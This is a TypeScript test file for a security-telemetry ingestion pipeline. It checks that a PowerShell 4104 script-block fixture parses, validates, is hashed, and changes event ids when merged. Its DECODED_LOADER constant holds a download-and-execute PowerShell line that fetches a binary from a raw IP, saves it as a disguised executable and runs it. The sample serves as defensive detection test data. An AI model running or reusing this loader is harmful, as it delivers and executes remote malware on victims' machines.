// The 4104 LANE — `fixtures/raw-aux/powershell-4104.jsonl`.
//
// This file is the ingest-extensibility showcase and it lives BESIDE the pin folder,
// never inside it. Ids are reconstructed by position in a global timestamp sort, so a
// fifth dialect inserted mid-stream shifts every later id — and every content-derived
// candidate id downstream with it. That is inherent to the id model, not a defect, and
// the tests below hold both halves of it: the aux lane parses and scores as telemetry,
// AND it stays out of `fixtures/raw/`.
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { copyFileSync, mkdtempSync, readdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { ingestFolder } from '../../src/ingest/index.js';
import { repoRoot } from '../../src/lib/paths.js';
import { loadEvents } from '../../src/schema/events.js';
import { extractScriptBlockEntity } from '../../src/pipeline/util/extract-script-block-entity.js';

const FIXTURES = join(repoRoot(), 'fixtures');
const RAW_DIR = join(FIXTURES, 'raw');
const AUX_DIR = join(FIXTURES, 'raw-aux');

const DECODED_LOADER = "$w=New-Object Net.WebClient;$b=$w.DownloadData('https://193.42.33.81/u/nb');"
  // The doubled backslashes are the canon EncodedCommand's own escaping, decoded verbatim.
  + "$p=$env:LOCALAPPDATA+'\\\\npm-cache\\\\_tmp\\\\node-bridge.exe';"
  + '[IO.File]::WriteAllBytes($p,$b);Start-Process $p';

describe('4104 lane — fixtures/raw-aux ingests as telemetry', () => {
  it('parses the derived script-block file into one normalized event', async () => {
    const result = await ingestFolder(AUX_DIR);

    assert.equal(result.normalized, false);
    assert.deepEqual(result.byDialect, { 'powershell/script_block': 1 });
    const event = result.events[0] as unknown as Record<string, unknown>;

    assert.equal(event.id, 'evt-00001', 'the lane is numbered on its own when ingested alone');
    assert.equal(event.source, 'powershell');
    assert.equal(event.event_type, 'script_block');
    assert.equal(event.event_id, 4104);
    assert.equal(event.host, 'DEVBOX-07');
    assert.equal(event.message_number, 1);
    assert.equal(event.message_total, 1);
    // The EncodedCommand the emitter decoded out of evt-00676's command line.
    assert.equal(event.script_block_text, DECODED_LOADER);
    assert.equal(
      event.timestamp,
      '2026-03-09T14:00:15.600Z',
      'the fragment is stamped ε after its spawning process_create',
    );
  });

  it('survives loadEvents validation (the schema admits the powershell branch)', async () => {
    const { events } = await ingestFolder(AUX_DIR);
    const dir = mkdtempSync(join(tmpdir(), 'athanor-4104-'));
    const path = join(dir, 'events.json');
    writeFileSync(path, JSON.stringify(events, null, 2), 'utf-8');

    const loaded = await loadEvents(path);
    assert.equal(loaded.length, 1, 'the 4104 record must pass loadEvents, not be filtered out');
    assert.equal(loaded[0]!.id, 'evt-00001');
  });

  it('carries a script-block entity (sha256 of the text, the LFA rarity key)', async () => {
    const { events } = await ingestFolder(AUX_DIR);
    const entity = extractScriptBlockEntity(events[0] as Record<string, unknown>);

    assert.equal(entity, createHash('sha256').update(DECODED_LOADER, 'utf8').digest('hex'));
  });
});

describe('4104 lane — the aux folder is NOT the pin folder', () => {
  it('keeps fixtures/raw at exactly the four canon dialect files', () => {
    assert.deepEqual(readdirSync(RAW_DIR).filter((name) => !name.startsWith('.')).sort(), [
      'conn.log',
      'ssl.log',
      'sysmon-eid1.jsonl',
      'sysmon-eid3.jsonl',
    ], 'a fifth file in fixtures/raw/ would renumber every event Pin C asserts');
    assert.deepEqual(readdirSync(AUX_DIR).filter((name) => !name.startsWith('.')).sort(), [
      'powershell-4104.jsonl',
    ]);
  });

  it('demonstrates why: adding the lane mid-stream shifts every later id', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'athanor-4104-merged-'));
    for (const name of readdirSync(RAW_DIR)) copyFileSync(join(RAW_DIR, name), join(dir, name));
    copyFileSync(join(AUX_DIR, 'powershell-4104.jsonl'), join(dir, 'powershell-4104.jsonl'));

    const merged = await ingestFolder(dir);
    const canon = await ingestFolder(RAW_DIR);

    assert.equal(merged.events.length, canon.events.length + 1);

    const scriptBlockIndex = merged.events.findIndex((event) => event.event_type === 'script_block');
    assert.ok(scriptBlockIndex > 0 && scriptBlockIndex < canon.events.length,
      'the derived fragment lands mid-stream, not at either end');

    // Everything before it keeps its canon id; everything after it is renumbered.
    assert.equal(merged.events[scriptBlockIndex - 1]!.id, canon.events[scriptBlockIndex - 1]!.id);
    assert.equal(merged.events[scriptBlockIndex + 1]!.id, 'evt-'
      + String(scriptBlockIndex + 2).padStart(5, '0'));
    assert.notEqual(merged.events[scriptBlockIndex + 1]!.id, canon.events[scriptBlockIndex]!.id);
  });
});
